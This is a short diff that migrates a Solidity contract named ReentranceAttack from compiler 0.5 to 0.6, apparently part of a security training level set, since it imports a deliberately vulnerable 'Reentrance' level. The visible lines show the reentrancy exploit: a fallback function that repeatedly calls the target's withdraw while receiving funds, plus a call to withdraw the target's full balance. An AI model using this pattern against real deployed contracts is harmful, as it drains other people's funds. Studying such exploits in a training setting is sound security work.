@@ -1,4 +1,4 @@
-pragma solidity ^0.5.0;
+pragma solidity ^0.6.0;
 
 import '../levels/Reentrance.sol';
 
@@ -19,7 +19,7 @@ contract ReentranceAttack {
     target.withdraw(address(target).balance);
   }
 
-  function() external payable {
+  fallback() external payable {
     target.withdraw(1);
   }
 }
